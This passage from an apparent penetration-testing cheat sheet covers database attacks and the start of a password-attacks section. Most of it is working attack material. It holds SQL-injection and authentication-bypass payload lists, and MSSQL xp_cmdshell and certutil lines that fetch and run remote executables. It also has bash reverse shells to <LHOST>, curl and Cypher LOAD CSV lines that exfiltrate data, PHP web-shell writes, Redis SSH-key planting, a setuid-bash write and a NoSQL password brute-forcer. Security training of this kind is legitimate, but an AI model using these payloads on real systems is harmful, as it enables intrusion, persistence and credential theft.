MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.## TO '<USERNAME>'@'%';
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> use <DATABASE>
Database changed

MariaDB [admirer]> create table <TABLE>(data VARCHAR(255));
Query OK, 0 rows affected (0.008 sec)
```

### Configure Remote Access

```c
$ sudo vi /etc/mysql/mariadb.conf.d/50-server.cnf
```

```c
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
#bind-address            = 127.0.0.1
bind-address            = 0.0.0.0
```

```c
MariaDB [mysql]> FLUSH PRIVILEGES;
MariaDB [mysql]> GRANT ALL ON *.* TO 'root'@'%' IDENTIFIED BY '<PASSWORD>';
```

### Attach External Database

```c
$ sudo systemctl start mysql.service
$ sqlite3
```

```c
sqlite> attach "Audit.db" as db1;
sqlite> .databases
main:
db1: /PATH/TO/DATABASE/<DATABASE>.db
sqlite> .tables
db1.DeletedUserAudit  db1.Ldap              db1.Misc
sqlite> SELECT ## FROM db1.DeletedUserAudit;
```

### Linked SQL Server Enumeration

```c
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

### Register new Sysadmin User

```c
SQL> EXEC ('EXEC (''EXEC sp_addlogin ''''sadmin'''', ''''p4ssw0rd!'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

### Python Code Execution

```c
SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'print( "foobar" );';
SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami");';
```

### xp_cmdshell

#### Execute Script HTTP Server

```c
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LHOST>/<SCRIPT>.ps1\");"
```

#### Start xp_cmdshell via MSSQL

```c
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

##### Alternative Way to start xp_cmdshell

```c
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

#### Import PowerShell Scripts and execute Commands

##### Without Authentication

```c
SQL> xp_cmdshell powershell -c import-module C:\PATH\TO\FILE\<FILE>.ps1; <FILE> <OPTIONS>
```

##### With Authentication

```c
SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\",\"<PASSWORD>\");Import-Module C:\PATH\TO\FILE\<FILE>.ps1;<FILE> <OPTIONS>
```

#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) on a Logon Field

```c
';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
```

#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) in URL

```c
http://<RHOST>/index.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

```c
http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/<FILE>.exe C:\Windows\Temp\<FILE>.exe'; --
```

```c
http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
```

## mysqldump

```c
$ mysqldump --databases <DATABASE> -u<USERNAME> -p<PASSWORD>    // no space between parameter and input!
```

## NoSQL Injection

```c
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null} }
```

### Bruteforce Values

```c
import requests
import re
import string

http_proxy  = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy,
            }

url = "<RHOST>/?search=admin"

done = False
pos = 0
key = ""
while not done:
  found = False
  for _, c in enumerate(string.digits+string.ascii_lowercase+'-'):
    payload = url + "' %26%26 this.password.match(/^"+key+c+".*$/)%00"
    r = requests.get(payload, proxies=proxyDict)
    if "admin</a>" in r.text:
      found = True
      key += c
      print key
      break
  if not found:
    print "Done."
    break
  pos += 1
```

## PostgreSQL

```c
$ psql
$ psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

### Common Commands

```c
postgres=# \l                        // list all databases
postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c <DATABASE>             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
<DATABASE>=# \dt                     // list tables from current schema
<DATABASE>=# \dt *.*                 // list tables from all schema
<DATABASE>=# \du                     // list users roles
<DATABASE>=# \du+                    // list users roles
<DATABASE>=# SELECT user;            // get current user
<DATABASE>=# TABLE <TABLE>;          // select table
<DATABASE>=# SELECT * FROM users;    // select everything from users table
<DATABASE>=# SHOW rds.extensions;    // list installed extensions
<DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
```

### Command Execution

```c
<DATABASE>=# x'; COPY (SELECT '') TO PROGRAM 'curl http://<LHOST>?f=`whoami|base64`'-- x
```

#### File Write

```c
<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
```

## Redis

```c
$ redis-cli -h <RHOST>
$ redis-cli -s /run/redis/redis.sock
```

### Common Commands

```c
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> HSET       // set value if a field within a hash data structure
> HGET       // retrieves a field and his value from a hash data structure
> HKEYS      // retrieves all field names from a hash data structure
> HGETALL    // retrieves all fields and values from a hash data structure
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```

#### Examples

##### Add User

```c
redis /run/redis/redis.sock> HSET barfoo username foobar
redis /run/redis/redis.sock> HSET barfoo first-name foo
redis /run/redis/redis.sock> HSET barfoo last-name bar
redis /run/redis/redis.sock> HGETALL barfoo
```

##### Retrieve a specific Value

```c
redis /run/redis/redis.sock> KEYS *
redis /run/redis/redis.sock> SELECT 1
redis /run/redis/redis.sock> TYPE <VALUE>
redis /run/redis/redis.sock> HKEYS <VALUE>
redis /run/redis/redis.sock> HGET <VALUE> password
```

### Enter own SSH Key

```c
$ redis-cli -h <RHOST>
$ echo "FLUSHALL" | redis-cli -h <RHOST>
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
$ cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
<RHOST>:6379> save
OK
```

## SQL

### Write to File

```c
SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/PATH/TO/FILE/<FILE>'
```

## sqlcmd

```c
$ sqlcmd -S <RHOST> -U <USERNAME>
$ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
```

## SQL Injection (SQLi)

> https://github.com/payloadbox/sql-injection-payload-list

> https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet

### Comments

```c
#       // Hash comment
/*      // C-style comment
-- -    // SQL comment
;%00    // Nullbyte
`       // Backtick
```

### Wildcard Operators

`%a` value starts with `a`
`e%` value ends with `e`

### Protection

* Prepared Statements (Parameterized Queries)
* Input Validation
* Escaping User Input

### Master List

```c
';#---
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

### Authentication Bypass

```c
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 LIKE 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

### Testing APIs

```c
{"id":"56456"}                   // ok
{"id":"56456 AND 1=1#"}          // ok
{"id":"56456 AND 1=2#"}          // ok
{"id":"56456 AND 1=3#"}          // error
{"id":"56456 AND sleep(15)#"}    // sleep 15 seconds
```

### Payloads

```c
SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWORD>';
```

```c
1%27/**/%256fR/**/50%2521%253D22%253B%2523=="0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z",===query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login==' AND (SELECT 8871 FROM (SELECT(SLEEP(5)))uZxz)
```

#### Explanation

```c
1=1    // is always true
--     // comment
-      // special character at the end just because of sql
```

### Manual SQL Injection

#### Skeleton Payload

```c
SELECT ? FROM ? WHERE ? LIKE '%amme%';    // control over amme
SELECT ? FROM ? WHERE ? LIKE '%'%';       // errors out because of the single quote
SELECT ? FROM ? WHERE ? LIKE '%';-- %';   // wildcard wich equals = ';--
SELECT ? FROM ? WHERE ? LIKE '%hammer' AND 1 = SLEEP(2);-- %';    // blind sql injection because of sleep is implemented in mysql
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT 1,2,3 FROM dual);-- %';    // UNION sticks together two columns and put it out; output queries to the screen is super bad!
```

- JOIN = merging columns 1 by 1
- UNION = appending

```c
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3) FROM information_schema.tables;-- %';    // information_schema.tables is an information table
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT COLUMN_NAME, 2,3 FROM information_schema.columns WHERE TABLE_NAME = 'users');-- %';
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FROM users);-- %';
```

### Manual In-Band SQL Injection

> https://<RHOST>/article?id=3

```c
'    # causes error printed out on the page
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3    # received a message about the columns
0 UNION SELECT 1,2,3    # output from two tables
0 UNION SELECT 1,2,database()    # received database name
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '<DATABASE>'
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.columns WHERE table_name = '<TABLE>'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM <TABLE>
```

### Manual Blind SQL Injection (Authentication Bypass)

> https://<RHOST>/article?id=3

```c
0 SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
```

### Manual Blind SQL Injection (BooleanBased)

> https://<RHOST>/checkuser?username=admin

```c
admin123' UNION SELECT 1;--    # value is false
admin123' UNION SELECT 1,2;--    # value is false
admin123' UNION SELECT 1,2,3;--    # value changed to true
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--    # database name starts with "s"
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = '<DATABASE>' AND table_name='users';--    # enumerating tables
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE table_schema='<DATABASE>' AND table_name='users' AND column_name LIKE 'a%';    # enumerating columns
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%    # query for a username which starts with "a"
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'ad%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'adm%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admi%
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admin%
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '12%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '123%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1234%';--
```

### Manual Blind SQL Injection (Time-Based)

> https://<RHOST>/analytics?referrer=<RHOST>

```c
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--    # the query created a 5 second delay which indicates that it was successful
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'a%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'ad%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'adm%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'admi%';--
admin123' UNION SELECT SLEEP(5),2 WHERE table_schema='users' and column_name LIKE 'admin%';--
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE 'a%';--
```

### SQL Command Injection

```c
$ ls -l&host=/var/www
$ command=bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'%26host=
```

### SQL Truncation Attack

> https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html

```c
'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb' (URL encoded instead of spaces)
```

### SQL UNION Injection

```c
foobar" UNION SELECT NULL, NULL, @@hostname, @@version; #
foobar" UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEMATA; #
foobar" UNION SELECT 1, user, password, authentication_string FROM mysql.user; #
```

### List Tables

```c
UNION SELECT 1,table_name,3,4 FROM information_schema.tables;
```

### List Columns

```c
UNION SELECT 1,column_name,3,4 FROM information_schema.columns;
```

### Username and Password Fields

```c
UNION SELECT 1,concat(login,':',password),3,4 FROM users;
```

### Example of UNION Injection with enumerating information_schema

```c
SELECT group_concat(table_name,":",column_name,"\n") FROM information_schema.columns where table_schema = 'employees'
```

### URL Encoded SQL Injection

```c
http://<RHOST>/database.php?id=1%20UNION%20SELECT%201,concat%28table_name,%27:%27,%20column_name%29%20FROM%20information_schema.columns
```

### File Read

```c
uname=foo' UNION ALL SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL; -- &password=bar
```

### Dump to File

```c
SELECT ## FROM <TABLE> INTO dumpfile '/PATH/TO/FILE'
```

### Dump PHP Shell

```c
SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'
```

### Read File Obfuscation

```c
SELECT LOAD_FILE(0x633A5C626F6F742E696E69)    // reads C:\boot.ini
```

### Cipher Injection

#### Check Server Version

```c
' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions
as version LOAD CSV FROM 'http://<LHOST>/?version=' + version + '&name=' + name + '&edition=' + edition as
l RETURN 0 as _0 //
```

#### Get Label

```c
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://<LHOST>/?label='+label as
l RETURN 0 as _0 //
```

#### Get Key Properties

```c
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://<LHOST>/?' + p
+'='+toString(f[p]) as l RETURN 0 as _0 //
```

## sqlite3

```c
$ sqlite3 <FILE>.db
```

```c
sqlite> .tables
sqlite> PRAGMA table_info(<TABLE>);
sqlite> SELECT * FROM <TABLE>;
```

## sqlmap

> https://github.com/sqlmapproject/sqlmap

```c
--batch         // don't ask any questions
--current-db    // dumps database
```

```c
$ sqlmap --list-tampers
$ sqlmap -r <FILE>.req --level 5 --risk 3 --threads 10
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables -D <DATABASE> --dump
$ sqlmap -r <FILE>.req --level 5 --risk 3 --tables users --dump --threads 10
$ sqlmap -r <FILE>.req -p <ID>
$ sqlmap -r <FILE>.req -p <ID> --dump
$ sqlmap -r <FILE>.req -p <ID> --passwords
$ sqlmap -r <FILE>.req -p <ID> --read-file+/etc/passwd
$ sqlmap -r <FILE>.req -p <ID> --os-cmd=whoami
$ sqlmap -r <FILE>.req  --dbs -D <DATABASE> -T <TABLE> --force-ssl --dump
$ sqlmap -r <FILE>.req  --dbs -D <DATABASE> -T <TABLE> -C id,is_staff,username,password --where "is_staff=1" --force-pivoting -pivot-column id --force-ssl --dump
```

### Using Cookies

```c
$ sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq"
```

### Using Flask Token

```c
$ sqlmap http://<RHOST>/ --eval="FROM flask_unsign import session as s; session = s.sign({'uuid': session}, secret='<SECRET_KEY>')" --cookie="session=*" --delay 1 --dump
```

### Using Web Sockets

```c
$ sqlmap --url "ws://<DOMAIN>" --data='{"params":"help","token":"<TOKEN>"}'
```

#### Fix Websocket Errors (sqlmap requires third-party module 'websocket-client' in order to use WebSocket functionality)

> https://stackoverflow.com/questions/40212252/python-websockets-module-has-no-attribute/40212593#40212593

> https://pypi.org/project/websocket-client-py3/

Try to install potentially missing modules first.

```c
$ pip install websocket-client
$ pip3 install websocket-client
$ pip install websocket-client-py3
$ pip3 install websocket-client-py3
$ pip install sqlmap-websocket-proxy
$ pip3 install sqlmap-websocket-proxy
```

If this does not help, uninstall the modules manually
and re-install them afterwards.

```c
$ pip install websocket-client
$ pip3 install websocket-client
$ pip uninstall websocket-client-py3
$ pip3 uninstall websocket-client-py3
```

#### sqlmap Web Socket Proxy Python Script

> https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

```c
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
  ws = create_connection(ws_server)
  # If the server returns a response on connect, use below line 
  #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
  
  # For our case, format the payload in JSON
  message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
  data = '{"employeeID":"%s"}' % message

  ws.send(data)
  resp = ws.recv()
  ws.close()

  if resp:
    return resp
  else:
    return ''

def middleware_server(host_port,content_type="text/plain"):

  class CustomHandler(SimpleHTTPRequestHandler):
    def do_GET(self) -> None:
      self.send_response(200)
      try:
        payload = urlparse(self.path).query.split('=',1)[1]
      except IndexError:
        payload = False
        
      if payload:
        content = send_ws(payload)
      else:
        content = 'No parameters specified!'

      self.send_header("Content-type", content_type)
      self.end_headers()
      self.wfile.write(content.encode())
      return

  class _TCPServer(TCPServer):
    allow_reuse_address = True

  httpd = _TCPServer(host_port, CustomHandler)
  httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
  middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
  pass
```

#### Execution

```c
$ sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```

### Getting Shell

```c
$ sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
```

### Getting Reverse Shell

```c
$ os-shell> bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
```

### Upgrade Shell

```c
$ postgres@<RHOST>:/home$ SHELL=/bin/bash script -q /dev/null
```

### File Read

```c
$ sqlmap -R <REQUEST> --level 5 --risk 3 --file-read=/etc/passwd --batch
```

### Search for Email

```c
$ sqlmap -r <REQUEST>.reg -p email --level 4 --risk 3 --batch
```

### Grabbing NTLMv2 Hashes with sqlmap and Responder

```c
$ sudo python3 Responder.py -I <INTERFACE>
$ sqlmap -r login.req --sql-query="exec master.dbo.xp_dirtree '\\\\<LHOST>\\share'"
```

## sqlmap Websocket Proxy

> https://github.com/BKreisel/sqlmap-websocket-proxy

```c
$ sqlmap-websocket-proxy -u 'ws://ws.<RHOST>:5789/version' -p '{"version": "2\u0022 %param%"}' --json
```

```c
$ sqlmap -u 'http://localhost:8080/?param1=1'
```

## sqsh

```c
$ sqsh -S <RHOST> -U <USERNAME>
$ sqsh -S '<RHOST>' -U '<USERNAME>' -P '<PASSWORD>'
$ sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
```

### List Files and Folders with xp_dirtree

```c
1> EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```

## XPATH Injection

```c
test' or 1=1 or 'a'='a
test' or 1=2 or 'a'='a
'or substring(Password,1,1)='p' or'    // checking letter "p" on the beginning of the password
'or substring(Password,2,1)='p' or'    // checking letter "p" on the second position of the password
```





# Password Attacks

- [Resources](#resources)

## Table of Contents

- [AES](#aes)
- [bkcrack](#bkcrack)
- [CrackMapExec](#crackmapexec)
- [fcrack](#fcrack)
- [GPG](#gpg)
- [Hash-Buster](#hash-buster)
- [hashcat](#hashcat)
- [Hydra](#hydra)
- [John](#john)
- [Kerbrute](#kerbrute)
- [LaZagne](#lazagne)
- [LUKS](#luks)
- [Medusa](#medusa)
- [mimikatz](#mimikatz)
- [MultiDump](#multidump)
- [NetExec](#netexec)
- [Patator](#patator)
- [PDFCrack](#pdfcrack)
- [pypykatz](#pypykatz)
- [RsaCtfTool](#rsactftool)
- [SprayingToolkit](#sprayingtoolkit)
- [VNC Password Recovery](#vnc-password-recovery)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BetterSafetyKatz | Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory. | https://github.com/Flangvik/BetterSafetyKatz |
| bkcrack | Crack legacy zip encryption with Biham and Kocher's known plaintext attack. | https://github.com/kimci86/bkcrack |
| CrackMapExec | CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. | https://github.com/byt3bl33d3r/CrackMapExec |
| CredMaster | Refactored & improved CredKing password spraying tool, uses FireProx APIs to rotate IP addresses, stay anonymous, and beat throttling | https://github.com/knavesec/CredMaster |
| Default Credentials Cheat Sheet | One place for all the default credentials to assist the pentesters during an engagement, this document has a several products default credentials that are gathered from several sources. | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| DeHashed | Breach Database | https://dehashed.com |
| DomainPasswordSpray | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS! | https://github.com/dafthack/DomainPasswordSpray |
| Firefox Decrypt | Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles | https://github.com/unode/firefox_decrypt |
| go-mimikatz | A wrapper around a pre-compiled version of the Mimikatz executable for the purpose of anti-virus evasion. | https://github.com/vyrus001/go-mimikatz |
| hashcat | Password Cracking | https://hashcat.net/hashcat |
| Hob0Rules | Password cracking rules for Hashcat based on statistics and industry patterns | https://github.com/praetorian-inc/Hob0Rules |
| Hydra | Password Brute Force | https://github.com/vanhauser-thc/thc-hydra |
| John | Password Cracking | https://github.com/openwall/john |
| keepass-dump-masterkey | Script to retrieve the master password of a keepass database <= 2.53.1 | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | A python tool to automate KeePass discovery and secret extraction. | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. | https://github.com/ropnop/kerbrute |
| LaZagne | The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. | https://github.com/AlessandroZ/LaZagne |
| mimikatz | Extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. | https://github.com/gentilkiwi/mimikatz |
| MultiDump | MultiDump is a post-exploitation tool for dumping and extracting LSASS memory discreetly. | https://github.com/Xre0uS/MultiDump |
| NetExec | The Network Execution Tool | https://github.com/Pennyw0rth/NetExec |
| ntlm.pw | This website offers a NTLM to plaintext password "cracking" service, using a custom high performance database with billions of precomputed password hashes. | https://ntlm.pw |
| Patator | Password Brute Force | https://github.com/lanjelot/patator |
| pypykatz | Mimikatz implementation in pure Python. | https://github.com/skelsec/pypykatz |
| RsaCtfTool | RSA multi attacks tool : uncipher data from weak public key and try to recover private key Automatic selection of best attack for the given public key. | https://github.com/Ganapati/RsaCtfTool |
| SharpChromium | .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins. | https://github.com/djhohnstein/SharpChromium |
| SprayingToolkit | A set of Python scripts/utilities that tries to make password spraying attacks against Lync/S4B & OWA a lot quicker, less painful and more efficient. | https://github.com/byt3bl33d3r/SprayingToolkit |
| TheSprayer | TheSprayer is a cross-platform tool designed to help penetration testers spray passwords against an Active Directory domain without locking out accounts. | https://github.com/coj337/TheSprayer |
| TREVORspray | TREVORspray is a modular password sprayer with threading, clever proxying, loot modules, and more! | https://github.com/blacklanternsecurity/TREVORspray |

## AES

### Cracking AES Encryption

#### Create AES File

```c
aes-256-ctr
aes-128-ofb
aes-192-ofb
aes-256-ofb
aes-128-ecb
aes-192-ecb
aes-256-ecb
```

#### Create String File

```c
Tq+CWzQS0wYzs2rJ+GNrPLP6qekDbwze6fIeRRwBK2WXHOhba7WR2OGNUFKoAvyW7njTCMlQzlwIRdJvaP2iYQ==
```

#### For Loop

```c
$ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150645367566B59 -iv 0 -nopad -nosalt -base64; done
```

## bkcrack

### Cracking .zip File

```c
$ ./bkcrack -L <FILE>.zip
```

```c
$ cat plaintext.txt
Secret:HTB{
```

```c
$ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
```

## CrackMapExec

> https://github.com/byt3bl33d3r/CrackMapExec

### Installation via Poetry

```c
$ pipx install poetry
$ git clone https://github.com/Porchetta-Industries/CrackMapExec
$ cd CrackMapExec
$ poetry install
$ poetry run crackmapexec
```

### Modules

```c
$ crackmapexec ldap -L
$ crackmapexec mysql -L
$ crackmapexec smb -L
$ crackmapexec ssh -L
$ crackmapexec winrm -L
```

### Common Commands

```c
$ crackmapexec smb <RHOST> -u '' -p '' --shares
$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
$ crackmapexec smb <RHOST> -u " " -p "" --shares
$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
$ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute
$ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
